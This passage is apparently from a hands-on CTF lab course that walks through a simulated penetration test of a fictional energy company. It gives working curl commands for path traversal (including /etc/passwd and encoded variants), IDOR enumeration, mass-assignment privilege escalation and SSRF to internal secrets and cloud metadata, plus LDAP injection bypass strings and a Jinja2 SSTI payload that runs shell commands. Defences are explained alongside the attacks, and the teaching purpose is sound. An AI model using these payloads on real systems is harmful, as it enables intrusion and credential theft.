docs.title: Analysis Questions
docs.text:
1. The file server stores documents in /data/documents/ and secrets in /data/secrets/. An attacker only needs ../secrets/ to reach the credentials. What directory structure would make this traversal more difficult?

Reveal Answer

Storing sensitive files on a completely separate filesystem or volume would prevent traversal from reaching them. If /data/documents/ is a mounted volume and /data/secrets/ lives on an entirely different mount point (e.g., /opt/secure/secrets/), traversal from the document root cannot reach the secrets regardless of how many ../ sequences are used within the mount. Additionally, running the web application in a chroot jail or container with only the document directory mounted eliminates filesystem traversal entirely. The sibling directory layout (/data/documents/ next to /data/secrets/) is the worst-case scenario because a single ../ reaches the sensitive files.

2. The application returns the raw file contents in the HTTP response. How would the response differ if the application used a file-streaming approach with proper Content-Disposition headers, and would that prevent the attack?

Reveal Answer

Adding Content-Disposition: attachment; filename="document.txt" headers would force the browser to download the file rather than display it inline, but would not prevent the attack. The traversal vulnerability exists in the path construction logic, not in how the response is delivered. An attacker using curl or a script ignores Content-Disposition headers entirely. The response would still contain the file contents. Proper defense requires validating the resolved path against an allowlist or verifying it stays within the document root after canonicalization.

3. During the engagement, you used /proc/self/cmdline to learn about the running process. What other files in /proc/self/ would be valuable to an attacker exploiting path traversal?

Reveal Answer

Several /proc/self/ files provide valuable intelligence: /proc/self/environ exposes all environment variables (often containing database credentials, API keys, and secret tokens), /proc/self/cwd is a symlink to the current working directory, /proc/self/exe is a symlink to the running binary, /proc/self/fd/ contains file descriptors that may point to open log files or database connections, and /proc/self/maps shows memory mappings that reveal loaded libraries and ASLR base addresses. The environment variables file is the highest-value target because applications frequently store secrets in environment variables following the twelve-factor app methodology.

docs.title: Key Takeaways
docs.text:
• Path traversal exploits insufficient input validation on file path parameters to access files outside the intended directory
  • A single ../ can reach sibling directories; three ../ sequences from a typical document root reach the filesystem root
  • URL encoding (%2e%2e%2f) and double encoding (%252e%252e%252f) bypass naive string-matching filters
  • The /proc/self/ virtual filesystem exposes process metadata that accelerates exploitation
  • Storing sensitive files as siblings to web-accessible directories is a critical architectural mistake
  • Canonicalization (resolving the real path) combined with prefix checking is the most reliable server-side defense
  • The SCADA credentials extracted through this vulnerability enable the next phase of the engagement

docs.title: Before You Begin
docs.text:
The file server traversal in Exercise MEG3.1 demonstrated how a single missing input validation check can expose an entire filesystem. Now you turn to a more complex target: the Meridian Energy SCADA monitoring API. Unlike a simple file download feature, the monitoring API has multiple endpoints, token-based authentication, and role-based access control. However, each of these layers has a flaw. Your task is to discover and chain four vulnerabilities in sequence to escalate from a regular user account to full administrative access, and then leverage that access to reach an internal backend service that should never be reachable from the API.

Make sure you have:

  • Completed Exercise MEG3.1
  • VPN connected and verified
  • Terminal open with curl and jq available
  • Browser with Developer Tools for inspecting API calls
  • Notebook ready for recording findings

docs.title: Engagement Status
docs.text:
Phase Status Network Reconnaissance Complete (Chapter 1) Web Exploitation Complete (Chapter 2) File Server Traversal Complete (MEG3.1) API Exploitation Active Admin Takeover Pending

What you know so far: Path traversal on the file server exposed SCADA credentials and revealed the existence of internal monitoring infrastructure. Ahmed Al-Rashid, a Process Engineer, has legitimate access to the SCADA monitoring dashboard. His credentials were found during earlier reconnaissance.

docs.title: Scenario
docs.text:
Meridian Energy Group operates a SCADA monitoring dashboard that displays real-time data from industrial control systems across their power generation facilities. The dashboard is served by a REST API that handles authentication, alert management, user profiles, and administrative functions.

Ahmed Al-Rashid is a Process Engineer with standard user-level access to the monitoring system. His account can view alerts assigned to his facility and update his own profile. He cannot view alerts from other facilities, modify his role, or access administrative endpoints.

The API has four vulnerabilities that, when chained together, escalate Ahmed's standard account to full administrative access and enable server-side request forgery (SSRF) to reach an internal backend service:

  1. Insecure Direct Object Reference (IDOR) on the alerts endpoint allows any authenticated user to read alerts belonging to other users, including admin-only alerts
  2. Mass Assignment on the profile update endpoint accepts any JSON field, including role, allowing a user to self-promote to admin
  3. Server-Side Request Forgery (SSRF) on an admin-only endpoint fetches arbitrary URLs from the server side, reaching internal services that are not accessible from the external network
  4. Internal Service Exposure on the backend service returns secrets and configuration data to any request from a trusted internal IP

Credentials for this exercise:

Username Password Role a.alrashid@meridian-energy.corp Ahmed2024# Process Engineer

Target systems:

Hostname IP Offset Service monitor.meridian-energy.corp +10 SCADA monitoring dashboard api.meridian-energy.corp +11 Monitoring REST API

docs.title: Your Objectives
docs.text:
• Authenticate to the monitoring API and capture the bearer token
  • Exploit IDOR to enumerate alerts across all facilities, including admin-only alerts
  • Exploit mass assignment to escalate your role from user to admin
  • Use the admin SSRF endpoint to reach the internal backend service
  • Extract secrets from the backend service response
  • Document the complete four-phase attack chain

docs.title: Flag Progress
docs.text: Phase Vulnerability Outcome 1 Authentication Bearer token captured 2 IDOR Admin-only alerts read 3 Mass Assignment Role escalated to admin 4 SSRF Internal secrets extracted, flag retrieved

docs.title: Background: API Vulnerability Chaining
docs.text: Modern web applications are built on APIs. Authentication, data retrieval, user management, and administrative functions are all exposed through RESTful endpoints. Each endpoint represents an attack surface, and vulnerabilities rarely exist in isolation. Attackers chain multiple low-severity findings into high-impact attack paths.

docs.title: Insecure Direct Object References (IDOR)
docs.text:
IDOR occurs when an application exposes references to internal objects (database records, files, user accounts) through predictable identifiers without verifying that the requesting user has authorization to access the referenced object.

GET /api/v1/alerts/1    -> Returns alert ID 1 (your alert)
GET /api/v1/alerts/2    -> Returns alert ID 2 (someone else's alert)
GET /api/v1/alerts/100  -> Returns alert ID 100 (admin-only alert)

If the server returns all three without checking ownership, the endpoint has an IDOR vulnerability. The fix is authorization checks on every request: verify that the authenticated user owns or has permission to access the requested resource.

docs.title: Mass Assignment
docs.text:
Mass assignment occurs when an API endpoint binds incoming JSON fields directly to internal data model attributes without filtering. If the user profile model has a role field, and the API blindly applies all incoming JSON keys to the model, an attacker can include "role": "admin" in a profile update request.

Vulnerable code pattern:

# Dangerous: applies ALL incoming fields to the user object
user.update(**request.json)

Safe code pattern:

# Safe: only applies explicitly permitted fields
allowed = ['name', 'email', 'phone']
data = {k: v for k, v in request.json.items() if k in allowed}
user.update(**data)

docs.title: Server-Side Request Forgery (SSRF)
docs.text:
SSRF occurs when an application fetches a URL provided by the user from the server side. If the server sits on an internal network, the attacker can use it as a proxy to reach internal services that are not directly accessible.

POST /api/v1/admin/fetch
{"url": "http://backend-service:5000/internal/secrets"}

The API server resolves backend-service using internal DNS, connects to port 5000, retrieves the response, and returns it to the attacker. The backend service sees the request as coming from a trusted internal IP and responds without authentication.

sequenceDiagram
    participant A as Attacker
    participant API as API Server
    participant B as Backend Service
    A->>API: POST /admin/fetch {"url":"http://backend:5000/secrets"}
    API->>B: GET /secrets (from trusted internal IP)
    B->>API: {"secrets": "...", "flag": "OCR{...}"}
    API->>A: {"secrets": "...", "flag": "OCR{...}"}

docs.title: Chaining the Vulnerabilities
docs.text:
Individually, each vulnerability has moderate impact:

  • IDOR exposes data (information disclosure)
  • Mass assignment allows privilege escalation (but requires knowing the field name)
  • SSRF reaches internal services (but requires admin access to the endpoint)

Chained together, they form a complete compromise: authenticate as a regular user, read admin alerts to discover privileged functionality, escalate to admin, then use admin privileges to reach internal infrastructure.

docs.title: Tool Primer: curl for API Testing
docs.text:
API testing with curl requires precise control over HTTP methods, headers, and request bodies. The commands below form the foundation for every step in this exercise.

Pattern Purpose curl -X POST -H "Content-Type: application/json" -d '{"key":"val"}' Send JSON POST request curl -H "Authorization: Bearer <token>" Authenticate with bearer token curl -X PUT -H "Content-Type: application/json" -d '{"key":"val"}' Send JSON PUT request curl -s ... \| python3 -m json.tool Pretty-print JSON response curl -v Verbose mode showing request/response headers curl -o /dev/null -w "%{http_code}" Show only the HTTP status code

Capturing and reusing tokens:

# Store the token in a variable for reuse
TOKEN=$(curl -s -X POST http://api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"pass"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Use the token in subsequent requests
curl -s -H "Authorization: Bearer $TOKEN" http://api/endpoint

docs.title: Step 1: Launch the Exercise
docs.text: Navigate to the platform and launch the API Exploitation exercise (MEG3.2). Note the target IP addresses displayed in the Active Lab View. Two containers start: the monitoring dashboard and the API server.

docs.title: Step 2: Configure Host Resolution
docs.text:
Add the target hostnames to your /etc/hosts file:

Kali - Add target hostnames to /etc/hosts

echo "<subnet>.10  monitor.meridian-energy.corp" | sudo tee -a /etc/hosts
echo "<subnet>.11  api.meridian-energy.corp" | sudo tee -a /etc/hosts

docs.title: Step 3: Explore the Monitoring Dashboard
docs.text:
Open the monitoring dashboard in your browser or use curl:

Kali - Fetch the monitoring dashboard

curl -s http://monitor.meridian-energy.corp/

The dashboard displays a login form. Examine the HTML source for references to API endpoints. The frontend JavaScript will contain the API base URL and endpoint paths. Look for fetch() calls, axios configurations, or API_URL constants.

Kali - Search for API references in the dashboard source

curl -s http://monitor.meridian-energy.corp/ | grep -i "api"

You should find references to api.meridian-energy.corp and endpoint paths like /api/v1/auth/login, /api/v1/alerts, /api/v1/user/profile, and others.

docs.title: Step 4: Authenticate to the API
docs.text:
Use Ahmed's credentials to obtain a bearer token:

Kali - Authenticate to the monitoring API

curl -s -X POST http://api.meridian-energy.corp/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"a.alrashid@meridian-energy.corp","password":"Ahmed2024#"}' | python3 -m json.tool

The response should contain a JSON object with a token field (the bearer token) and user information including Ahmed's role (user or engineer). Record the token value. Every subsequent API request requires the token in the Authorization header.

Save the token in a shell variable for convenience:

Kali - Store the bearer token in a variable

TOKEN=$(curl -s -X POST http://api.meridian-energy.corp/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"a.alrashid@meridian-energy.corp","password":"Ahmed2024#"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "Token: $TOKEN"

Verify the token works by checking your profile:

Kali - Retrieve your user profile

curl -s -H "Authorization: Bearer $TOKEN" \
  http://api.meridian-energy.corp/api/v1/user/profile | python3 -m json.tool

The response should show Ahmed's profile with fields like name, email, role, and facility. Note the current role value. You should see something like "role": "user" or "role": "engineer".

docs.title: Step 5: View Your Own Alerts
docs.text:
The alerts endpoint shows monitoring alerts for the authenticated user's facility:

Kali - Fetch your assigned alerts

curl -s -H "Authorization: Bearer $TOKEN" \
  http://api.meridian-energy.corp/api/v1/alerts | python3 -m json.tool

The response returns an array of alerts. Each alert has an id, severity, message, facility, and assigned_to field. Note the alert IDs assigned to Ahmed. They may start at a specific number (e.g., 5, 6, 7).

docs.title: Step 6: Enumerate Other Users' Alerts
docs.text:
The alerts endpoint also accepts a specific alert ID. Try accessing alerts that are not assigned to Ahmed by requesting sequential IDs:

Kali - Access alert ID 1 (not assigned to your account)

curl -s -H "Authorization: Bearer $TOKEN" \
  http://api.meridian-energy.corp/api/v1/alerts/1 | python3 -m json.tool

If the response returns the alert data instead of a 403 Forbidden error, IDOR is confirmed. The API does not verify that the requesting user owns or has permission to view the requested alert.

docs.title: Step 7: Enumerate All Alerts
docs.text:
Loop through alert IDs to discover all alerts in the system, including admin-only alerts:

Kali - Enumerate alerts 1 through 20

for i in $(seq 1 20); do
  echo "=== Alert $i ==="
  curl -s -H "Authorization: Bearer $TOKEN" \
    http://api.meridian-energy.corp/api/v1/alerts/$i 2>/dev/null | python3 -m json.tool 2>/dev/null
  echo ""
done

Examine each alert carefully. Look for:

  • Different facilities: Alerts from power plants, substations, and control rooms that Ahmed should not have access to
  • Admin-only alerts: Alerts with "visibility": "admin" or "assigned_to": "admin" that contain sensitive operational data
  • Severity levels: Critical alerts may reference system vulnerabilities, configuration issues, or security incidents
  • Internal references: Alert messages may mention backend services, internal hostnames, or API endpoints that reveal the architecture

Record any alerts that reference administrative functionality, internal services, or backend systems. These details inform the next phase of the attack.

docs.title: Step 8: Analyze IDOR Findings
docs.text:
Document the IDOR findings:

Alert ID Facility Assigned To Visibility Key Finding

The IDOR vulnerability exposes the entire alert database to any authenticated user. In a SCADA monitoring context, this means any employee with a standard account can read operational alerts from every facility, including security-sensitive alerts that should be restricted to administrators.

docs.title: Step 9: Examine the Profile Update Endpoint
docs.text:
The user profile endpoint accepts PUT requests to update profile information. Start by understanding what fields the API expects:

Kali - Update your display name (legitimate use)

curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Ahmed Al-Rashid"}' \
  http://api.meridian-energy.corp/api/v1/user/profile | python3 -m json.tool

The response should confirm the update and return the full profile object. Note all the fields in the response. The profile likely includes name, email, role, facility, and possibly other fields.

docs.title: Step 10: Attempt Mass Assignment
docs.text:
Now include the role field in the update request. If the API does not filter incoming fields, it will apply the role change:

Kali - Exploit mass assignment to escalate role

curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Ahmed Al-Rashid","role":"admin"}' \
  http://api.meridian-energy.corp/api/v1/user/profile | python3 -m json.tool

Examine the response carefully. If the role field now shows "admin" instead of "user" or "engineer", mass assignment is confirmed. The API accepted the role field without validating whether the user has permission to modify it.

docs.title: Step 11: Verify the Escalation
docs.text:
Confirm that your elevated role persists and grants access to admin functionality:

Kali - Verify admin role assignment

curl -s -H "Authorization: Bearer $TOKEN" \
  http://api.meridian-energy.corp/api/v1/user/profile | python3 -m json.tool

The profile should show "role": "admin". You may need to re-authenticate to get a new token that reflects the updated role:

Kali - Re-authenticate to get admin-level token

TOKEN=$(curl -s -X POST http://api.meridian-energy.corp/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"a.alrashid@meridian-energy.corp","password":"Ahmed2024#"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "New token: $TOKEN"

docs.title: Step 12: Explore Admin Endpoints
docs.text:
With admin privileges, explore endpoints that were previously restricted:

Kali - List admin endpoints

curl -s -H "Authorization: Bearer $TOKEN" \
  http://api.meridian-energy.corp/api/v1/admin/ | python3 -m json.tool

Look for administrative functionality: user management, system configuration, report generation, and utility endpoints. Pay special attention to any endpoint that accepts a URL parameter or fetches external resources.

Kali - Check admin users endpoint

curl -s -H "Authorization: Bearer $TOKEN" \
  http://api.meridian-energy.corp/api/v1/admin/users | python3 -m json.tool

The admin users endpoint should reveal all user accounts in the system, including their roles and assigned facilities. Record any accounts with elevated privileges or references to backend services.

docs.title: Step 13: Discover the Fetch Endpoint
docs.text:
Among the admin endpoints, look for one that accepts a URL parameter. A common pattern is a "fetch" or "proxy" endpoint used for health checks, external data retrieval, or webhook testing:

Kali - Test the admin fetch endpoint with an external URL

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://example.com"}' \
  http://api.meridian-energy.corp/api/v1/admin/fetch | python3 -m json.tool

If the response contains the HTML from example.com, the endpoint fetches arbitrary URLs from the server side. The API server acts as a proxy, making the request on your behalf from its own network position.

docs.title: Step 14: Probe Internal Services
docs.text:
The API server sits on an internal network with access to backend services that are not reachable from your Kali machine. Use the SSRF endpoint to probe internal hostnames:

Kali - Probe the internal backend service

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://backend-service:5000/"}' \
  http://api.meridian-energy.corp/api/v1/admin/fetch | python3 -m json.tool

The backend-service hostname resolves on the internal network through Docker DNS or an internal DNS server. The backend service likely runs on port 5000 (a common Flask/Python default). If the response returns data, you have confirmed that the SSRF endpoint can reach internal services.

docs.title: Step 15: Extract Internal Secrets
docs.text:
Target the backend service's internal secrets endpoint:

Kali - Fetch internal secrets via SSRF

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://backend-service:5000/internal/secrets"}' \
  http://api.meridian-energy.corp/api/v1/admin/fetch | python3 -m json.tool

The backend service responds to requests from the trusted internal network without authentication. The response should contain configuration data, credentials, and the flag in OCR{...} format.

Examine the response for:

  • Database credentials: Connection strings for internal databases
  • API keys: Tokens for third-party integrations
  • SCADA configuration: Controller addresses, firmware versions, and access credentials
  • Flag: The exercise flag embedded in the secrets response

docs.title: Step 16: Try Additional Internal Targets
docs.text:
Expand your SSRF exploration to discover other internal services:

Kali - Probe for other internal services

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://backend-service:5000/internal/config"}' \
  http://api.meridian-energy.corp/api/v1/admin/fetch | python3 -m json.tool

Kali - Check if the backend has a health endpoint

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://backend-service:5000/health"}' \
  http://api.meridian-energy.corp/api/v1/admin/fetch | python3 -m json.tool

Kali - Probe localhost on the API server itself

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5000/"}' \
  http://api.meridian-energy.corp/api/v1/admin/fetch | python3 -m json.tool

Probing 127.0.0.1 (localhost) tests whether the API server itself runs additional services on other ports. Cloud metadata endpoints (http://169.254.169.254/latest/meta-data/) are also common SSRF targets in cloud environments.

docs.text: Record the complete attack chain and submit the flag on the platform.

docs.title: Analysis Questions
docs.text:
1. The IDOR vulnerability on the alerts endpoint returns data for any alert ID. What is the difference between horizontal and vertical IDOR, and which type is present in this exercise?

Reveal Answer

Horizontal IDOR occurs when a user accesses resources belonging to another user at the same privilege level (e.g., User A reads User B's alerts). Vertical IDOR occurs when a user accesses resources restricted to a higher privilege level (e.g., a standard user reads admin-only alerts). The alerts endpoint in this exercise exhibits both: Ahmed can read alerts assigned to other engineers (horizontal) and alerts restricted to administrators (vertical). The fix for both types is the same: server-side authorization checks on every request that verify the requesting user has permission to access the specific resource identified by the ID.

2. Mass assignment allowed escalation by including "role":"admin" in the profile update. Why is client-side field filtering (removing the role field from the frontend form) insufficient as a defense?

Reveal Answer

Client-side filtering only affects the browser. Attackers use tools like curl, Burp Suite, or custom scripts to send requests directly to the API, bypassing any client-side restrictions. The API receives raw HTTP requests and has no way to verify that they originated from the legitimate frontend. Defense must be server-side: the API must explicitly define which fields are permitted in each request and reject or ignore all others. An allowlist approach (only accept name, email, phone) is safer than a blocklist approach (reject role, is_admin) because new sensitive fields added to the model in the future will be automatically excluded from the allowlist.

3. The SSRF endpoint fetched http://backend-service:5000/internal/secrets because the backend service trusts requests from internal IPs. What network-level controls would prevent SSRF from reaching internal services?

Reveal Answer

Multiple layers of defense can mitigate SSRF: (1) Egress filtering on the API server using iptables or network policies to block outbound connections to internal subnets from the application process; (2) DNS rebinding protection that prevents resolution of internal hostnames; (3) URL allowlisting on the fetch endpoint that restricts permitted target URLs to a predefined list of external domains; (4) Network segmentation placing the backend service on a separate network segment that the API server cannot reach directly; (5) Authentication on internal services so that even if the request reaches the backend, it is rejected without a valid internal service token. The most robust approach combines URL validation with network-level egress controls.

4. Map the four-phase attack chain to MITRE ATT&CK techniques. Which technique IDs correspond to each phase?

Reveal Answer Phase MITRE ATT&CK Technique ID Authentication Valid Accounts: Cloud Accounts T1078.004 IDOR (alert enumeration) Data from Information Repositories T1213 Mass Assignment (privilege escalation) Valid Accounts: Cloud Accounts (privilege escalation via account manipulation) T1098 SSRF (internal service access) Exploitation of Remote Services T1210

The IDOR phase maps to T1213 because the attacker accesses data stored in the application's repository (alert database) through improper access controls. Mass assignment maps to T1098 (Account Manipulation) because the attacker modifies their own account attributes to gain elevated privileges. SSRF maps to T1210 because the attacker exploits the fetch endpoint as a proxy to reach and exploit an internal service. The complete chain demonstrates how seemingly moderate-severity vulnerabilities combine into a critical-impact attack path.

docs.title: Key Takeaways
docs.text:
• API vulnerabilities rarely exist in isolation; the real impact emerges when multiple findings are chained together
  • IDOR on data endpoints leaks information that informs subsequent attack phases
  • Mass assignment is a code-level vulnerability: the API must explicitly define which fields are permitted in update operations
  • SSRF transforms a web application into a proxy for attacking internal infrastructure
  • Internal services that trust requests based on source IP are vulnerable whenever an SSRF exists on the same network
  • Defense requires authorization checks on every endpoint, field-level input filtering, URL validation on outbound requests, and network-level egress controls
  • The credentials and access gained through API exploitation feed directly into the capstone attack in Chapter 4

docs.title: What You Accomplished
docs.text:
Chapter 3 moved the engagement from web applications to internal infrastructure. Two exercises targeted systems that Meridian Energy employees rely on daily: a document management system and a SCADA monitoring API. Both services were built for internal use, and both assumed that authenticated users would behave as expected.

Exercise Target Vulnerability Impact MEG3.1 File Server Path traversal Read arbitrary files including SCADA credentials MEG3.2 Monitoring API IDOR + Mass assignment + SSRF Full admin access, internal service compromise

docs.title: Infrastructure Attack Methodology
docs.text:
The exercises in this chapter follow a pattern that applies to any internal service assessment:

graph TD

    B --> C["Identify input<br/>handling flaws"]

The key insight: internal services are often more vulnerable than public-facing applications because developers assume the network perimeter provides sufficient protection. Once an attacker has valid credentials and network access (which earlier phases provided), internal services become high-value, low-resistance targets.

docs.text:
Path Traversal:

# Basic traversal
curl -b cookies.txt "http://target/download?file=../../../etc/passwd"

# URL-encoded traversal
curl -b cookies.txt "http://target/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Double-encoded traversal

API Authentication:

# Login and capture token
TOKEN=$(curl -s -X POST http://api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@corp","password":"pass"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Use token in requests
curl -s -H "Authorization: Bearer $TOKEN" http://api/endpoint

IDOR Enumeration:

# Sequential ID enumeration
for i in $(seq 1 100); do
  curl -s -H "Authorization: Bearer $TOKEN" http://api/resource/$i
done

Mass Assignment:

# Include unexpected field in update
curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Normal","role":"admin"}' \
  http://api/user/profile

SSRF:

# Internal service probe
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-host:5000/secrets"}' \
  http://api/admin/fetch

docs.title: Connection to Chapter 4
docs.text:
The infrastructure attacks in Chapter 3 accomplished two things: they demonstrated that Meridian Energy's internal services lack basic security controls, and they provided additional credentials and intelligence for the final phase.

Chapter 4 targets the crown jewel: the IT administration portal. Protected by LDAP authentication and serving a report generator built with Jinja2 templates, the admin portal is the last barrier between you and the engineering database. The SCADA credentials from the file server traversal and the API intelligence from the monitoring system both feed into the final attack chain.

The capstone exercise chains LDAP injection, server-side template injection, credential discovery, and lateral movement into a single attack sequence. Every technique you have practiced in Chapters 1 through 3 comes together in Chapter 4.

docs.title: Self-Assessment
docs.text:
Before moving to Chapter 4, verify that you can answer these questions without looking at the walkthroughs:

  • Can you explain why ../ traverses up one directory level?
  • Can you URL-encode a traversal sequence by hand?
  • Can you describe the difference between horizontal and vertical IDOR?
  • Can you explain why client-side field filtering does not prevent mass assignment?
  • Can you describe how SSRF turns a web application into a proxy?
  • Can you explain why internal services that trust source IPs are vulnerable to SSRF?
  • Can you map each vulnerability to its MITRE ATT&CK technique?

If any of these are unclear, review the relevant exercise before proceeding. The capstone builds on every concept covered so far.

docs.title: The Engagement So Far
docs.text:
Three chapters of reconnaissance, web exploitation, and infrastructure attacks have built a comprehensive picture of Meridian Energy Group's security posture. You have mapped the network, compromised the employee portal, exploited path traversal on the file server, chained API vulnerabilities on the SCADA monitoring system, and recovered credentials from multiple internal services.

One target remains: the IT administration portal. Protected by LDAP authentication and accessible only to senior staff, the admin portal controls user provisioning, system configuration, and report generation for the entire Meridian Energy network. Behind it sits the engineering database, which stores SCADA controller configurations, maintenance schedules, and operational secrets.

docs.title: Capstone: Full Attack Chain
docs.text:
The final exercise in the Meridian Energy engagement is the longest and most complex. It requires chaining four distinct vulnerability classes across four systems in a single attack sequence. There are no shortcuts and no isolated steps. Each phase depends on information extracted from the previous one.

graph LR
    A["Admin Portal<br/>admin.meridian-energy.corp"] -->|"LDAP Injection<br/>Bypass Auth"| B["Admin Dashboard"]
    B -->|"SSTI in Report<br/>Generator"| C["Remote Code<br/>Execution"]
    C -->|"Extract DB<br/>Credentials"| D["Engineering DB<br/>eng-db.meridian-energy.corp"]
    D -->|"SQL Query"| E["Master Flag"]

    style A fill:#00d4ff,color:#000
    style B fill:#6aaa64,color:#fff
    style C fill:#e94560,color:#fff
    style D fill:#ffd700,color:#000
    style E fill:#ff6b6b,color:#fff

The chain:

  1. LDAP Injection bypasses authentication on the admin portal using a wildcard password
  2. Server-Side Template Injection (SSTI) in the report generator provides arbitrary code execution on the admin server
  3. Credential Discovery through environment variable leakage reveals engineering database credentials
  4. Lateral Movement to the engineering database extracts the master flag from a PostgreSQL table

Each technique maps to real-world attack patterns documented in MITRE ATT&CK. Energy sector breaches frequently involve exactly this progression: initial access through authentication bypass, execution through application-layer vulnerabilities, credential access through configuration leakage, and lateral movement to operational technology databases.

docs.title: Scenario
docs.text:
Meridian Energy Group's IT administration portal is the central management interface for the corporate network. Senior IT staff use it to provision user accounts, manage system configurations, generate compliance reports, and access engineering data. The portal authenticates against an LDAP directory server, where all employee credentials and organizational unit assignments are stored.

The administration portal includes a Report Generator feature built with Python and Jinja2 templates. Administrators enter report parameters into a web form, and the server renders the report using Jinja2's template engine. The rendered output includes data pulled from the engineering database, formatted according to the template.

Behind the admin portal sits the engineering database: a PostgreSQL instance that stores SCADA controller configurations, maintenance schedules, firmware versions, and operational secrets for every power generation facility in the Meridian Energy network. Access to the engineering database requires credentials that are stored in the admin portal's environment variables.

Sarah Chen, the Chief Information Security Officer, has an LDAP account. During earlier reconnaissance, you discovered her username (s.chen) but not her password. What you do know is that the LDAP server may be vulnerable to authentication bypass through wildcard injection.

Your mission: Chain LDAP injection, server-side template injection, credential discovery, and lateral movement to reach the engineering database and extract the master flag.

docs.title: Background: The Four Techniques
docs.text: The capstone exercise requires understanding four distinct vulnerability classes. Each section below explains the theory, provides examples, and describes real-world impact. Read all four sections before starting the walkthrough. Understanding the theory makes the exploitation intuitive rather than mechanical.

docs.title: LDAP Injection
docs.text:
The Lightweight Directory Access Protocol (LDAP) is a standard protocol for accessing directory services. Corporate environments use LDAP servers (Active Directory, OpenLDAP) to store user accounts, group memberships, organizational units, and authentication credentials. Web applications authenticate users by constructing LDAP queries from form input and checking whether the query returns a valid entry.

How LDAP authentication works:

When a user submits a login form with username s.chen and password SecurePass123, the application constructs an LDAP search filter:

(&(uid=s.chen)(userPassword=SecurePass123))

The & operator means AND: the query returns results only if both conditions match. The LDAP server searches the directory for an entry where uid equals s.chen AND userPassword equals SecurePass123. If exactly one entry matches, authentication succeeds.

How LDAP injection works:

LDAP supports wildcard characters. The asterisk * matches any value. If the application inserts user input directly into the LDAP filter without sanitization, an attacker can use * as the password:

(&(uid=s.chen)(userPassword=*))

The * matches any password value. The query returns the entry for s.chen regardless of the actual password, because every entry has some value in the userPassword field, and * matches all of them.

More advanced LDAP injection payloads:

Payload (password field) Resulting Filter Effect * (&(uid=s.chen)(userPassword=*)) Bypass password check *)(uid=*))(|(uid=* (&(uid=s.chen)(userPassword=*)(uid=*))(|(uid=*)) Return all entries *)(objectClass=* (&(uid=s.chen)(userPassword=*)(objectClass=*)) Match any object class

Real-world impact:

LDAP injection has been found in enterprise applications including:

  • Cisco Unity Connection (CVE-2024-20252)
  • Fortra GoAnywhere MFT (CVE-2024-0204)
  • Multiple healthcare and energy sector SCADA management interfaces

Defense:

  • Use LDAP bind operations instead of search filters for authentication (bind operations pass the password to the LDAP server for verification rather than embedding it in a search query)
  • Escape special LDAP characters (*, (, ), \, NUL) in user input using a library function like ldap.filter.escape_filter_chars() in Python
  • Validate input format before constructing queries (usernames should match ^[a-zA-Z0-9._-]+$)

docs.title: Server-Side Template Injection (SSTI)
docs.text:
Template engines generate dynamic content by combining a template (containing placeholders) with data. Jinja2 is a popular Python template engine used by Flask, Django (optionally), and many custom applications. When user input is inserted into a template string that gets compiled and rendered, the attacker can inject template syntax that executes arbitrary code.

How Jinja2 templates work:

from jinja2 import Template

# Safe: user data is passed as a variable
template = Template("Hello, {{ name }}!")
output = template.render(name=user_input)  # user_input is treated as data

# Vulnerable: user input IS the template
template = Template(f"Report for: {user_input}")  # user_input is compiled as template code
output = template.render()

In the safe pattern, user_input is passed as a variable and never interpreted as template syntax. In the vulnerable pattern, user_input is concatenated into the template string before compilation. If user_input contains {{7*7}}, Jinja2 compiles and evaluates it, producing 49.

SSTI detection payloads:

Payload Expected Output Confirms {{7*7}} 49 Template expression evaluation {{7*'7'}} 7777777 String multiplication (Python-specific) {{'test'.upper()}} TEST Method call execution {{config}} Application config object Access to Flask config {{config.items()}} Config key-value pairs Enumerate configuration

SSTI to Remote Code Execution (RCE):

Jinja2 runs in a sandboxed environment that restricts direct access to Python builtins. However, the sandbox can be escaped by traversing Python's Method Resolution Order (MRO) to reach the os module:

# Step 1: Access the string class
{{''.__class__}}
# Output: <class 'str'>

# Step 2: Access the base class (object)
{{''.__class__.__mro__}}
# Output: (<class 'str'>, <class 'object'>)

# Step 3: Access subclasses of object
{{''.__class__.__mro__[1].__subclasses__()}}
# Output: [<class 'type'>, <class 'weakref'>, ... hundreds of classes ...]

# Step 4: Find a class that imports os (e.g., warnings.catch_warnings)
# The index varies by Python version. An alternative approach uses cycler:
{{cycler.__init__.__globals__.os.popen('id').read()}}
# Output: uid=0(root) gid=0(root) groups=0(root)

The cycler class is a Jinja2 global that provides access to Python's os module through its __init__.__globals__ dictionary. The os.popen() method executes a shell command and returns its output.

Defense:

  • Never concatenate user input into template strings
  • Pass user data as template variables using template.render(data=user_input)
  • Use a sandboxed Jinja2 environment (jinja2.sandbox.SandboxedEnvironment) that restricts attribute access
  • Validate and sanitize user input to reject template syntax characters ({, }, %, #)

docs.title: Lateral Movement via Credential Discovery
docs.text:
